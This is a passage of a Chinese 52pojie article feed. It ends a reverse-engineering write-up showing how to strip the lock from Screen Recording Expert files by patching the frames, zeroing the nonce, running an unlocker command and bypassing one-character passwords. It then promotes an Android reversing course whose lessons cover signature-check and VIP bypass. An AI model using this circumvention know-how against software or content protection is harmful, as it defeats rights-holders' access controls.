253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span>  ................ <br /><span style="color: rgb(255, 115, 253);">37</span>A:<span style="color: rgb(255, 115, 253);">65</span>A7  <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span>  ................ <br /><span style="color: rgb(255, 115, 253);">37</span>A:<span style="color: rgb(255, 115, 253);">65</span>B7  <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span> <span style="color: rgb(255, 115, 253);">00</span>                                      ....</code></pre><p>是窗体的一些配置信息，和我们研究的内容没啥关系。</p><p>到这里就没有明显的线索继续了，<code style="font-family: SFMono-Regular, Consolas, ;">_TPlayForm_FormCreate</code> 函数就此结束。</p><p>不过别急，还记得之前查找的 <code style="font-family: SFMono-Regular, Consolas, ;">DecompressImage_4027BC</code> 调用链吗？</p><blockquote><ul class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">_TPlayForm_FormShow</code> → <code style="font-family: SFMono-Regular, Consolas, ;">_TPlayForm_repareplay2(...)</code> → <code style="font-family: SFMono-Regular, Consolas, ;">DecompressImage_4027BC(...)</code></p></li></ul></blockquote><p>我们现在位于 <code style="font-family: SFMono-Regular, Consolas, ;">_TPlayForm_repareplay1</code> 函数，进行了第一段初始化；<br />那么合理猜测，<code style="font-family: SFMono-Regular, Consolas, ;">_TPlayForm_repareplay2</code> 函数有第二部分的初始化代码。</p><p>猜测下初始化的流程：</p><ul><li style="margin-left: 2px;"><p>初始化播放器主窗口</p></li><ul class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p>触发事件 <code style="font-family: SFMono-Regular, Consolas, ;">FormCreate</code>，调用 <code style="font-family: SFMono-Regular, Consolas, ;">_TPlayForm_repareplay1</code> 进行第一阶段的初始化。</p></li><li style="margin-left: 2px;"><p>触发事件 <code style="font-family: SFMono-Regular, Consolas, ;">FormShow</code>，调用 <code style="font-family: SFMono-Regular, Consolas, ;">_TPlayForm_repareplay2</code> 进行后续部分的初始化。</p></li></ul></ul><p>抵达 <code style="font-family: SFMono-Regular, Consolas, ;">_TPlayForm_repareplay2</code> 后，记得尝试补充下结构体来优化阅读体验，大概补充出“文件流”和它 <code style="font-family: SFMono-Regular, Consolas, ;">VTable</code> 里的部分方法名就好，不需要处理得很完美：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(146, 255, 184);">// 像这样：</span><br /><span style="color: rgb(150, 203, 254);">this</span>-&gt;file_stream-&gt;vt-&gt;read(<span style="color: rgb(150, 203, 254);">this</span>-&gt;file_stream, &amp;temp_u32, <span style="color: rgb(255, 115, 253);">4</span>);<br />DecompressImage(<span style="color: rgb(150, 203, 254);">this</span>, <span style="color: rgb(150, 203, 254);">this</span>-&gt;bitmap2, <span style="color: rgb(150, 203, 254);">this</span>-&gt;file_stream, temp_u32, ...);</code></pre><p>将整个函数代码复制下来，重点观察 <code style="font-family: SFMono-Regular, Consolas, ;">file_stream</code> 是如何读取数据的：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(146, 255, 184);">// 在屏幕录像专家 V2014 和 V2023 版本生成的文件中，off_reader 的值等价于之前找到的 “0xaae0a + 4” 的结果。</span><br /><span style="color: rgb(150, 203, 254);">this</span>-&gt;file_stream-&gt;vt-&gt;seek(<span style="color: rgb(150, 203, 254);">this</span>-&gt;file_stream, off_reader, SEEK_SET); <br /><span style="color: rgb(146, 255, 184);">// 读入 40 字节数据。这里面有重要的东西，需要记录下来备用。</span><br /><span style="color: rgb(150, 203, 254);">this</span>-&gt;file_stream-&gt;vt-&gt;read(<span style="color: rgb(150, 203, 254);">this</span>-&gt;file_stream, &amp;<span style="color: rgb(150, 203, 254);">this</span>-&gt;field_14D8, <span style="color: rgb(255, 115, 253);">40</span>);<br /><span style="color: rgb(146, 255, 184);">// 此处跳过一堆意义不明的数据读取过程，都是固定长度的数据，因此不需要花费太多时间分析。</span><br /><span style="color: rgb(146, 255, 184);">// 不清楚这个 flag 的含义，解密的时候照抄就好。</span><br /><span style="color: rgb(150, 203, 254);">if</span> (<span style="color: rgb(150, 203, 254);">this</span>-&gt;field_14D8.field_24 == <span style="color: rgb(255, 115, 253);">1</span>) {<br />  <span style="color: rgb(146, 255, 184);">// 读入两个 f32 浮点数</span><br />  <span style="color: rgb(150, 203, 254);">this</span>-&gt;file_stream-&gt;vt-&gt;read(<span style="color: rgb(150, 203, 254);">this</span>-&gt;file_stream, &amp;temp_u32, <span style="color: rgb(255, 115, 253);">4</span>);<br />  <span style="color: rgb(150, 203, 254);">this</span>-&gt;file_stream-&gt;vt-&gt;read(<span style="color: rgb(150, 203, 254);">this</span>-&gt;file_stream, &amp;temp_u32, <span style="color: rgb(255, 115, 253);">4</span>);<br />  <span style="color: rgb(146, 255, 184);">// LPE 数据，意义不明</span><br />  <span style="color: rgb(150, 203, 254);">this</span>-&gt;file_stream-&gt;vt-&gt;read(<span style="color: rgb(150, 203, 254);">this</span>-&gt;file_stream, &amp;temp_u32, <span style="color: rgb(255, 115, 253);">4</span>);<br />  TStream_CopyFrom((TStream *)<span style="color: rgb(150, 203, 254);">this</span>-&gt;stream2, <span style="color: rgb(150, 203, 254);">this</span>-&gt;file_stream, temp_u32);}<br /><span style="color: rgb(146, 255, 184);">// 开始解密第一帧数据了</span><br /><span style="color: rgb(150, 203, 254);">this</span>-&gt;file_stream-&gt;vt-&gt;read(<span style="color: rgb(150, 203, 254);">this</span>-&gt;file_stream, &amp;temp_u32, <span style="color: rgb(255, 115, 253);">4</span>);<br />DecompressImage(<span style="color: rgb(150, 203, 254);">this</span>, <span style="color: rgb(150, 203, 254);">this</span>-&gt;bitmap2, <span style="color: rgb(150, 203, 254);">this</span>-&gt;file_stream, temp_u32, ...);</code></pre><p>其中 <code style="font-family: SFMono-Regular, Consolas, ;">field_14D8</code> 有很多成员意义不明，有用的就这个 <code style="font-family: SFMono-Regular, Consolas, ;">field_24</code> 和代表帧数量的 <code style="font-family: SFMono-Regular, Consolas, ;">field_C</code>。</p><p>中间这些意义不明的数据不需要管它，只要知道如何抵达第一帧的位置即可：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 115, 253);">0xaae0a</span> <span style="color: rgb(146, 255, 184);">/* 初始偏移 */</span> + <span style="color: rgb(255, 115, 253);">4</span> <span style="color: rgb(146, 255, 184);">/* audio_offset */</span> <br />  + <span style="color: rgb(255, 115, 253);">40</span> <span style="color: rgb(146, 255, 184);">/* field_14D8 */</span><br />  + <span style="color: rgb(255, 115, 253);">20</span> + <span style="color: rgb(255, 115, 253);">20</span> + <span style="color: rgb(255, 115, 253);">40</span> + <span style="color: rgb(255, 115, 253);">4</span> + <span style="color: rgb(255, 115, 253);">4</span> + <span style="color: rgb(255, 115, 253);">4</span> + <span style="color: rgb(255, 115, 253);">20</span> + <span style="color: rgb(255, 115, 253);">4</span> + <span style="color: rgb(255, 115, 253);">1</span> + <span style="color: rgb(255, 115, 253);">1</span> + <span style="color: rgb(255, 115, 253);">1</span> + <span style="color: rgb(255, 115, 253);">1</span> <span style="color: rgb(146, 255, 184);">/* 无关数据 */</span><br />  + <span style="color: rgb(146, 255, 184);">/* field_14D8.field_24 == 1 */</span>(<span style="color: rgb(255, 115, 253);">4</span> + <span style="color: rgb(255, 115, 253);">4</span> + <span style="color: rgb(255, 115, 253);">4</span> <span style="color: rgb(146, 255, 184);">/* stream2 长度 */</span> + <span style="color: rgb(255, 115, 253);">0x2FE</span> <span style="color: rgb(146, 255, 184);">/* stream2 */</span>)<br />= <span style="color: rgb(255, 115, 253);">0xab1b8</span></code></pre><p>在编辑器验证一下找到的地址：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">00A:B1B0                          F6 D4 <span style="color: rgb(255, 115, 253);">01</span> <span style="color: rgb(255, 115, 253);">00</span>|<span style="color: rgb(255, 115, 253);">84</span> A9 <span style="color: rgb(255, 115, 253);">05</span> <span style="color: rgb(255, 115, 253);">00</span><br />00A:B1C0  <span style="color: rgb(255, 115, 253);">78</span> 9C CC <span style="color: rgb(255, 115, 253);">7D</span> <span style="color: rgb(255, 115, 253);">09</span> <span style="color: rgb(255, 115, 253);">78</span> <span style="color: rgb(255, 115, 253);">54</span> <span style="color: rgb(255, 115, 253);">45</span> B6 7F F5 <span style="color: rgb(255, 115, 253);">92</span> A4 3B 6B <span style="color: rgb(255, 115, 253);">77</span></code></pre><p>成功抵达第一帧的位置。</p><h2>修复</h2><p>算法和定位帧数据的逻辑都找到了，简单写个工具枚举全部帧然后打补丁就好。</p><p>补丁完后记得将结尾的 <code style="font-family: SFMono-Regular, Consolas, ;">nonce</code> 清零，去除锁定状态。</p><p>当然，我也做了个简单的解锁工具。源码和编译好的二进制文件都可以在 GitHub 或百度网盘找到。</p><p>使用方法很简单，起一个终端，然后执行：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">.\pmlxzj_unlocker.exe unlock <span style="color: rgb(168, 255, 96);">"吾爱破解培训第六课：潜伏在程序身边的黑影--实战给程序补丁.exe"</span> <span style="color: rgb(168, 255, 96);">"666.exe"</span></code></pre><p>（XP 或 32 位系统应使用 <code style="font-family: SFMono-Regular, Consolas, ;">pmlxzj_unlocker_i686.exe</code>；XP 下中文显示会乱码）</p><p>把解锁后的文件放到屏幕录像专家里看看：</p><p style="text-align: center;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://wechat2rss.xlab.app/img-proxy/?k=ee9952ea&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZL4XgG125RiaR6iaofsiaN1nCnibGEWl0dh8fyeJI32ia3jMpSPhxQFgEUOh5OguBx1iaofSibsE4oKZvLWg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>非常完美！可以修改设定然后转换格式。</p><h2>结语/碎碎念</h2><p>算法不是特别复杂，主要是“面向对象”的各种虚表调用看起来头大。</p><p>研究这算法比我用 OBS 连续翻录两次完整教程的时间还长。</p><p>OBS 永远的神，屏幕录像专家可以说是时代的眼泪了…</p><p>一开始也想过所谓的“高度无损压缩”会是什么黑科技，结果却发现就是简单的 gzip 压缩有点失望。</p><p>解锁工具顺便做了解锁“播放加密”文件的支持（需要提供原始密码）。不过，如果原始密码只有一位，可以添加 <code style="font-family: SFMono-Regular, Consolas, ;">-r</code> 来绕过（偷偷说一声，第一位密码不参与数据解密的）。</p><p style="margin-bottom: 0px; line-height: normal;"><br /></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1952469-1-1.html">阅读原文</a></p>
<p><a href="https://wechat2rss.xlab.app/link-proxy/?k=debc87d9&amp;r=1&amp;u=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMjM5Mjc3MDM2Mw%3D%3D%26mid%3D2651141055%26idx%3D1%26sn%3D3ecd9d00265e4df3ee8002864be0df3c%26chksm%3Dbd50a3eb8a272afd09362907ca830f232dcfb686b3750a2d5633d577c26ae56c44890e26ba20%26scene%3D58%26subscene%3D0%23rd">跳转微信打开</a></p>
]]></content:encoded>
<pubDate>Thu, 08 Aug 2024 15:24:18 +0800</pubDate>
</item>
<item>
<title>吾爱破解安卓逆向入门教程《安卓逆向这档事》番外实战篇3-拨云见日之浅谈Flutter逆向</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651141046&amp;idx=1&amp;sn=9aca0e7944652654d970b582336d8f52&amp;chksm=bd50a3e28a272af47da389fe562367a254a194f9f9e258471cd016e680d1e839d2e1420fd91e&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651141046&amp;idx=1&amp;sn=9aca0e7944652654d970b582336d8f52&amp;chksm=bd50a3e28a272af47da389fe562367a254a194f9f9e258471cd016e680d1e839d2e1420fd91e&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<p>
原创 <span>吾爱pojie</span> <span>2024-08-07 18:08</span> <span style="display: inline-block;">北京</span>
</p>

<p>由吾爱破解论坛移动安全区版主 正己录制的吾爱破解安卓逆向 0基础 新手小白 视频教程《安卓逆向这档事》正式上线啦，如果你想学习安卓逆向，这是一个不错的机会呦！</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/img-proxy/?k=447e84b3&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZJibg5JrO31B8sticV5Dc5ZUB6licHh3SqDaZS5QwBG5CzGroPiavfqLxztibiaQuzyRMSo9S1RiaIsIxLibw%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p style="margin-bottom: 0px; line-height: normal;"><strong style="background-color: rgb(255, 255, 255); letter-spacing: 0.544px; text-align: start; font-size: 20px;"><span>作者</span></strong><strong style="background-color: rgb(255, 255, 255); letter-spacing: 0.544px; text-align: start; font-size: 20px;"><span>论</span></strong><strong style="background-color: rgb(255, 255, 255); letter-spacing: 0.544px; text-align: start; font-size: 20px;"><span>坛账号：正己</span></strong></p><p><br /></p><p><span style="background-color: rgb(255, 251, 0);">这是面向 <strong>0基础</strong> <strong>新手入门</strong> 的<strong>视频动画教程</strong>，后面一大段文字只是视频讲解课件，直接拉到<strong>底部点击“</strong><strong>阅读原文”</strong><strong>观看视频</strong>，手把手教学，入门建议从第一课学起，持续更新中。</span></p><p><span>由吾爱破解论坛移动安全区版主 正己录制的吾爱破解安卓逆向</span><span style="color: rgb(255, 0, 0);"><strong><span> 0基础 新手小白 视频教程</span></strong></span><span>《安卓逆向这档事》正式上线啦，如果你想学习安卓逆向，这是一个不错的机会呦！</span></p><p><span>前情提要：<a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651141015&amp;idx=1&amp;sn=f5e09409bc7c21d76f924e57754ece4f&amp;chksm=bd50a3c38a272ad56480f610a8ab36830d2a87765b5df9398ffc90feb6cb147232570c45e21b&amp;scene=21#wechat_redirect" target="_blank">吾爱破解安卓逆向入门教程《安卓逆向这档事》二十课、抓包学得好，牢饭吃得饱(上)</a></span></p><p style="margin-bottom: 0px; line-height: normal;"><br /></p><p style="line-height: normal; margin-bottom: 0px;"><img class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=5749ba22&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJibg5JrO31B8sticV5Dc5ZUBc9MYdz0qYkZT6nMGUpdGcO6VibpmZKiaR6Y8Pz90U8AicqRua7wAibdSow%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /><br /></p><p>1.了解Flutter基本概念以及识别特征2.了解Flutter应用的抓包对抗策略<br />3.了解Flutter反编译以及实战</p><p>1.某读app2.proxypin<br />3.blutter</p><h2>略。。。过程太长见论坛远程，看视频教程就行。</h2><p><span>百度云：</span></p><p><span style="font-size: 15px;">https://pan.baidu.com/s/1cFWTLn14jeWfpXxlx3syYw?pwd=nqu9</span></p><p><span style="font-size: 15px;">阿里云PS：</span></p><p><span style="font-size: 15px;">https://www.aliyundrive.com/s/TJoKMK6du6x</span></p><p><span style="font-size: 15px;">哔哩哔哩：</span></p><p><span style="font-size: 15px;">https://www.bilibili.com/video/BV1X24y1m7cj</span></p><p><span style="font-size: 15px;">教程开源地址：</span></p><p><span style="font-size: 15px;">https://github.com/ZJ595/AndroidReverse</span></p><p><span style="font-size: 15px;"><br /></span></p><p><span>PS:解压密码都是52pj，阿里云由于不能分享压缩包，所以下载exe文件，双击自解压</span></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138475&amp;idx=1&amp;sn=e3c5242b7c51f022fcc0efb7f626ab61&amp;chksm=bd50b9ff8a2730e9484df2faa08ed63c1980d5f230b69200450917b0daae1904505c878daca8&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》一、模拟器环境搭建</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138483&amp;idx=1&amp;sn=efa7eabbf0b0cc637a0ccdf8dd62abe5&amp;chksm=bd50b9e78a2730f1f994976f36a60dd8390c4920396b8aec2052b4a666d91d18555096fc8172&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》二、初识APK文件结构、双开、汉化、基础修改</a><br /><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138541&amp;idx=1&amp;sn=c7482f59c3d830b2646e276761928941&amp;chksm=bd50b9b98a2730af72e1f9e346663c12973821967c1ac002f5fcdabd0182af5f6106b36d6a01&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》三、初识smail，vip终结者</a><br /><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138554&amp;idx=1&amp;sn=be2fe7ffb0520ef17405a754ff0725c8&amp;chksm=bd50b9ae8a2730b84d054c7bd903f8a066251266e16cb1438999759797383e6f20aa656fbbff&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》四、恭喜你获得广告&amp;弹窗静默卡</a><br /><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138674&amp;idx=1&amp;sn=17a3271b1771bdacf3392fb64dcc5dc3&amp;chksm=bd50ba268a273330bea4fd1804afff15b9308ed53c88d9aa26a363da0bdeff63642fcce3a42b&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》五、1000-7=？&amp;动态调试&amp;Log插桩</a><br /><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138693&amp;idx=1&amp;sn=a09896ce9c1aa5e7194600ff7ca011e9&amp;chksm=bd50bad18a2733c7c536438f5181eb3d73a57c0349e010fda23d7973cb0ebf272f15b82be56a&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》六、校验的N次方-签名校验对抗、PM代{过}{滤}理、IO重定向</a><br /><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138779&amp;idx=1&amp;sn=7201ed7aca4cdd6954787022c7f26b81&amp;chksm=bd50ba8f8a2733998f65348060f3f6202bea1bba2f61d27e259ecf5521425ccdfcbb93510d06&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》七、Sorry，会Hook真的可以为所欲为-Xposed快速上手(上)模块编写,常用Api</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138987&amp;idx=1&amp;sn=c36c67b952a02f676fcdd5fb5c42abbc&amp;chksm=bd50bbff8a2732e9c5b256ec89ab50fe1df5158dfbcd4592f4440f564dec4d31e20387e0175b&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》八、Sorry，会Hook真的可以为所欲为-xposed快速上手(下)快速hook</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139179&amp;idx=1&amp;sn=26e374dfb5776d41a7d3501770915a77&amp;chksm=bd50bc3f8a2735293c12856cfabf63aa694a2c66b8846a83eb9e301ac60d31484ed1600b8e1c&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》九、密码学基础、算法自吐、非标准加密对抗</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139564&amp;idx=1&amp;sn=ed1a626174cd39572544fa54e320e135&amp;chksm=bd50bdb88a2734ae34b4d4bad5de061a368863cab0ac1e51c5969c926a6ebab29fbe5f729cbf&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十、不是我说，有了IDA还要什么女朋友？</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139620&amp;idx=1&amp;sn=d65e23f4c8a5bc6cf94637af05025cea&amp;chksm=bd50be708a273766f5f00b91d3df8921283fecb3b2b54432bdee2b2b3330b5ea76c68f857bc9&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十二、大佬帮我分析一下</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139664&amp;idx=1&amp;sn=8f76acd55355f1000afc0c85e35212b0&amp;chksm=bd50be048a2737124982c5985c5a5b2393fafcf77a30f43adb9072719092167c35f738afccce&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》番外实战篇1-某电影视全家桶</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139714&amp;idx=1&amp;sn=28cc2ca160f7168a5ac43f658c5b57cd&amp;chksm=bd50bed68a2737c0ed9ff5513b2cf6aa5bcc6176f28b14f47bf8d32485b1d557bbc5f14f65bc&amp;scene=21#wechat_redirect" target="_blank"><span style="color: rgb(68, 68, 68);">《安卓逆向这档事》十三、是时候学习一下Frida一把梭了(上)</span></a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139750&amp;idx=1&amp;sn=17a282c1f0e2c56e7d8321867bc2685e&amp;chksm=bd50bef28a2737e4dae8032de4d19cf8e226a00801419c34b837b02074e10f84fe1c1aec4130&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十四、是时候学习一下Frida一把梭了(中)</a></p><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139756&amp;idx=1&amp;sn=6c91893c01ccde3637ee64551ad67884&amp;chksm=bd50bef88a2737ee2eb88ce9c760937d701be06858c3dfec10af97f70b2ef847ebcf2b66e56f&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十五、是时候学习一下Frida一把梭了(下)</a></p><p><span style="color: rgb(87, 107, 149);"><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139867&amp;idx=1&amp;sn=cf9c990403c548b8495b3dde935a4644&amp;chksm=bd50bf4f8a273659ea78e3d7c191cdab463b4bc469f63fd5749028dba0fbf79fd796d74308fc&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十六、是时候学习一下Frida一把梭了(终)</a></span></p><p><span style="color: rgb(87, 107, 149);"><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140090&amp;idx=1&amp;sn=d8b3011c016ae650d83db7bd9363878c&amp;chksm=bd50bfae8a2736b8260a8115ae2b0b95c929c8b221cabd8733853f6ba5409180b6a1443b30c0&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十七、你的RPCvs佬的RPC</a></span></p><p><span style="color: rgb(87, 107, 149);"><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140106&amp;idx=1&amp;sn=47a4d985cc32e332e1e039fc810896de&amp;chksm=bd50a05e8a272948a2fc4af36269aeb24616aec58c3391d960ad4b6d37709bcdf1b5242891af&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》番外实战篇2-【2024春节】解题领红包活动，启动!</a></span></p><p><span style="color: rgb(87, 107, 149);"><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140642&amp;idx=1&amp;sn=cf8328f89aff48e3c338fee43e3a5d43&amp;chksm=bd50a2768a272b60ea07cc97059a54accace2b6e99ed2ac50d1e10ffc2370eae73f2c32e65d9&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十八、表哥，你也不想你的Frida被检测吧!(上)</a></span></p><p><span style="color: 